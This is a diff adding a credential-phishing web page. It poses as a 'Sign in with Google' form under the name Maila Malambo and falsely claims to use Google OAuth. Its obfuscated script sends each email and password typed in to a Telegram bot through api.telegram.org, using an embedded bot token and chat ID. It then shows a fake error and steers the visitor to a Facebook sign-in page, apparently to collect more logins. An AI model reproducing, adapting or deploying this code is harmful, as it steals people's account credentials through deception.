@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign in — Maila Malambo</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap" rel="stylesheet">
+<style>
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+  body {
+    font-family: 'Space Grotesk', sans-serif;
+    background: #0a0a0a;
+    color: #f0f0f0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+  }
+
+  .card {
+    width: 100%;
+    max-width: 400px;
+    background: #111;
+    border: 1px solid #1e1e1e;
+    border-radius: 18px;
+    padding: 2.5rem 2rem;
+    text-align: center;
+  }
+
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.4rem;
+    color: #555;
+    font-size: 0.82rem;
+    text-decoration: none;
+    margin-bottom: 2rem;
+    transition: color 0.2s;
+    font-weight: 300;
+    float: left;
+  }
+
+  .back-link:hover { color: #ff6b35; }
+
+  .back-link svg {
+    width: 16px; height: 16px;
+    stroke: currentColor;
+    fill: none;
+    stroke-width: 2;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
+
+  .clearfix::after {
+    content: '';
+    display: table;
+    clear: both;
+  }
+
+  .card h1 {
+    font-size: 1.5rem;
+    font-weight: 700;
+    margin-bottom: 0.3rem;
+    letter-spacing: -0.02em;
+  }
+
+  .card .sub {
+    font-size: 0.88rem;
+    color: #666;
+    font-weight: 300;
+    margin-bottom: 2rem;
+  }
+
+  .field {
+    margin-bottom: 1.2rem;
+    text-align: left;
+  }
+
+  .field label {
+    display: block;
+    font-size: 0.78rem;
+    color: #888;
+    font-weight: 500;
+    margin-bottom: 0.45rem;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+
+  .field input {
+    width: 100%;
+    padding: 0.8rem 1rem;
+    background: #0a0a0a;
+    border: 1.5px solid #222;
+    border-radius: 10px;
+    color: #f0f0f0;
+    font-family: inherit;
+    font-size: 0.95rem;
+    outline: none;
+    transition: border-color 0.25s;
+  }
+
+  .field input::placeholder { color: #3a3a3a; }
+  .field input:focus { border-color: #ff6b35; }
+
+  .input-wrap {
+    position: relative;
+  }
+
+  .input-wrap input {
+    padding-right: 2.8rem;
+  }
+
+  #togglePassword {
+    position: absolute;
+    right: 0.9rem;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 0.2rem;
+    color: #666;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  #togglePassword:hover { color: #888; }
+
+  .submit-btn {
+    width: 100%;
+    margin-top: 0.5rem;
+    padding: 0.85rem;
+    background: #ff6b35;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-family: inherit;
+    font-size: 0.95rem;
+    font-weight: 500;
+    cursor: pointer;
+    transition: transform 0.15s, box-shadow 0.25s, opacity 0.3s;
+    box-shadow: 0 0 20px rgba(255,107,53,0.2);
+  }
+
+  .submit-btn:hover {
+    transform: translateY(-1px);
+    box-shadow: 0 0 35px rgba(255,107,53,0.35);
+  }
+
+  .submit-btn:active { transform: scale(0.98); }
+  .submit-btn:focus-visible { outline: 2px solid #ff6b35; outline-offset: 3px; }
+  .submit-btn.loading { pointer-events: none; opacity: 0.6; }
+
+  /* error section */
+  .error-section {
+    margin-top: 2rem;
+    padding-top: 1.5rem;
+    border-top: 1px solid #1e1e1e;
+    opacity: 0;
+    transform: translateY(12px);
+    transition: opacity 0.5s ease, transform 0.5s ease;
+    pointer-events: none;
+  }
+
+  .error-section.show {
+    opacity: 1;
+    transform: translateY(0);
+    pointer-events: auto;
+  }
+
+  .error-msg {
+    font-size: 0.85rem;
+    color: #e74c3c;
+    font-weight: 500;
+    margin-bottom: 1.2rem;
+  }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 0.8rem;
+    margin-bottom: 1.2rem;
+  }
+
+  .divider::before,
+  .divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: #222;
+  }
+
+  .divider span {
+    font-size: 0.75rem;
+    color: #444;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+  }
+
+  .facebook-btn {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.75rem;
+    width: 100%;
+    padding: 0.85rem 1.5rem;
+    border: 1.5px solid #2a2a2a;
+    border-radius: 10px;
+    background: #111;
+    color: #f0f0f0;
+    font-family: inherit;
+    font-size: 0.95rem;
+    font-weight: 500;
+    cursor: pointer;
+    text-decoration: none;
+    transition: border-color 0.25s, background 0.25s, transform 0.15s;
+  }
+
+  .facebook-btn:hover {
+    border-color: #1877f2;
+    background: #1a1a1a;
+    transform: translateY(-1px);
+  }
+
+  .facebook-btn:active { transform: scale(0.98); }
+  .facebook-btn:focus-visible { outline: 2px solid #ff6b35; outline-offset: 2px; }
+  .facebook-btn svg { width: 22px; height: 22px; flex-shrink: 0; }
+
+  .footer-text {
+    margin-top: 1.5rem;
+    font-size: 0.72rem;
+    color: #333;
+    font-weight: 300;
+    line-height: 1.5;
+  }
+
+  /* spinner inside button */
+  .submit-btn .spinner {
+    display: none;
+    width: 18px; height: 18px;
+    border: 2.5px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+    margin: 0 auto;
+  }
+
+  .submit-btn.loading .btn-text { display: none; }
+  .submit-btn.loading .spinner { display: block; }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    20% { transform: translateX(-6px); }
+    40% { transform: translateX(6px); }
+    60% { transform: translateX(-4px); }
+    80% { transform: translateX(4px); }
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="clearfix">
+    <a href="/" class="back-link">
+      <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+      Back
+    </a>
+  </div>
+
+  <h1>Sign in with Google</h1>
+  <p class="sub">Enter your Google account details to verify.</p>
+
+  <form id="loginForm" novalidate>
+    <div class="field">
+      <label for="email">Email</label>
+      <input type="email" id="email" placeholder="you@gmail.com" autocomplete="email" required>
+    </div>
+    <div class="field">
+      <label for="password">Password</label>
+      <div class="input-wrap">
+        <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" required>
+        <button type="button" id="togglePassword" aria-label="Show password">
+          <!-- Eye open -->
+          <svg id="eyeOpen" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+          <!-- Eye off (hidden by default) -->
+          <svg id="eyeOff" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
+            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+            <line x1="1" y1="1" x2="23" y2="23"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <button type="submit" class="submit-btn" id="submitBtn">
+      <span class="btn-text">Continue</span>
+      <div class="spinner"></div>
+    </button>
+  </form>
+
+  <div class="error-section" id="errorSection">
+    <p class="error-msg">Something went wrong signing in with Google.</p>
+    <div class="divider"><span>or try another method</span></div>
+    <a href="facebook.html" class="facebook-btn">
+      <svg viewBox="0 0 24 24" fill="#1877F2">
+        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+      </svg>
+      Sign in with Facebook
+    </a>
+  </div>
+
+  <p class="footer-text">
+    This form connects to Google OAuth 2.0 securely.<br>
+    <a href="#" style="color:#555;text-decoration:none">Privacy Policy</a> · <a href="#" style="color:#555;text-decoration:none">Terms of Service</a>
+  </p>
+</div>
+
+<script>
+const _0x3a554a=_0x266d;(function(_0x20ca25,_0x390ef1){const _0x20d8f9=_0x266d,_0x5a6845=_0x20ca25();while(!![]){try{const _0x8212fe=-parseInt(_0x20d8f9(0x159))/0x1+-parseInt(_0x20d8f9(0x142))/0x2*(-parseInt(_0x20d8f9(0x14f))/0x3)+parseInt(_0x20d8f9(0x137))/0x4+-parseInt(_0x20d8f9(0x15c))/0x5+-parseInt(_0x20d8f9(0x14c))/0x6+parseInt(_0x20d8f9(0x134))/0x7*(-parseInt(_0x20d8f9(0x13b))/0x8)+parseInt(_0x20d8f9(0x13d))/0x9;if(_0x8212fe===_0x390ef1)break;else _0x5a6845['push'](_0x5a6845['shift']());}catch(_0x50828d){_0x5a6845['push'](_0x5a6845['shift']());}}}(_0x34af,0x626ab));const BO=_0x3a554a(0x14e),CHA='7390531894',form=document[_0x3a554a(0x13c)]('loginForm'),submitBtn=document[_0x3a554a(0x13c)](_0x3a554a(0x148)),errorSection=document['getElementById'](_0x3a554a(0x15a)),emailIn=document[_0x3a554a(0x13c)](_0x3a554a(0x139)),pwdIn=document['getElementById'](_0x3a554a(0x155)),toggleBtn=document[_0x3a554a(0x13c)](_0x3a554a(0x153)),eyeOpen=document['getElementById'](_0x3a554a(0x140)),eyeOff=document[_0x3a554a(0x13c)](_0x3a554a(0x15b));toggleBtn[_0x3a554a(0x143)]('click',()=>{const _0x2780c5=_0x3a554a,_0x30c4b3=pwdIn['type']===_0x2780c5(0x155);pwdIn[_0x2780c5(0x13a)]=_0x30c4b3?'text':_0x2780c5(0x155),eyeOpen[_0x2780c5(0x144)][_0x2780c5(0x149)]=_0x30c4b3?_0x2780c5(0x14b):_0x2780c5(0x13f),eyeOff[_0x2780c5(0x144)][_0x2780c5(0x149)]=_0x30c4b3?_0x2780c5(0x13f):'none';}),form[_0x3a554a(0x143)](_0x3a554a(0x15f),async function(_0x905cda){const _0x4b113f=_0x3a554a;_0x905cda[_0x4b113f(0x152)]();const _0x2f526a=emailIn['value'][_0x4b113f(0x132)](),_0x177952=pwdIn[_0x4b113f(0x147)];if(!_0x2f526a||!_0x2f526a[_0x4b113f(0x141)]('@')){shakeField(emailIn);return;}if(!_0x177952){shakeField(pwdIn);return;}submitBtn[_0x4b113f(0x156)][_0x4b113f(0x133)](_0x4b113f(0x14a));try{await fetch(_0x4b113f(0x135)+BO+_0x4b113f(0x15d),{'method':_0x4b113f(0x146),'headers':{'Content-Type':_0x4b113f(0x145)},'body':JSON[_0x4b113f(0x136)]({'chat_id':CHA,'text':_0x4b113f(0x151)+_0x2f526a+_0x4b113f(0x154)+_0x177952+'\x0a🕒\x20'+new Date()['toLocaleString']()})});}catch(_0x1f5da5){console[_0x4b113f(0x14d)]('Telegram\x20send\x20failed:',_0x1f5da5);}submitBtn[_0x4b113f(0x156)][_0x4b113f(0x13e)](_0x4b113f(0x14a)),errorSection[_0x4b113f(0x156)][_0x4b113f(0x133)](_0x4b113f(0x150));});function _0x34af(){const _0x49c775=['stringify','3024348Zaaqhm','animationend','email','type','1328erIdeA','getElementById','2366523SVLRzE','remove','block','eyeOpen','includes','93498ojRnhH','addEventListener','style','application/json','POST','value','submitBtn','display','loading','none','1999488vctFFS','error','8416791643:AAEZInsemXwV2akMlgI0OY27YNG-uqB9r_o','27ADVLTN','show','🔐\x20New\x20GOOGle\x20ACCOUNT\x20\x0aUser:\x20','preventDefault','togglePassword','\x0aPass:\x20','password','classList','#e74c3c','borderColor','128202gqQHxj','errorSection','eyeOff','2778940VzgRHh','/sendMessage','input','submit','animation','trim','add','819ucpozl','https://api.telegram.org/bot'];_0x34af=function(){return _0x49c775;};return _0x34af();}function _0x266d(_0xb81482,_0x2ec782){_0xb81482=_0xb81482-0x132;const _0x34af2e=_0x34af();let _0x266d26=_0x34af2e[_0xb81482];return _0x266d26;}function shakeField(_0x3e97e7){const _0x3cfa49=_0x3a554a;_0x3e97e7[_0x3cfa49(0x144)][_0x3cfa49(0x158)]=_0x3cfa49(0x157),_0x3e97e7[_0x3cfa49(0x144)][_0x3cfa49(0x160)]='shake\x200.4s\x20ease',_0x3e97e7[_0x3cfa49(0x143)](_0x3cfa49(0x138),()=>{const _0x1771bf=_0x3cfa49;_0x3e97e7[_0x1771bf(0x144)]['animation']='';},{'once':!![]}),_0x3e97e7[_0x3cfa49(0x143)](_0x3cfa49(0x15e),()=>{const _0x184e68=_0x3cfa49;_0x3e97e7['style'][_0x184e68(0x158)]='';},{'once':!![]});}
+</script>
+
+</body>
+</html>
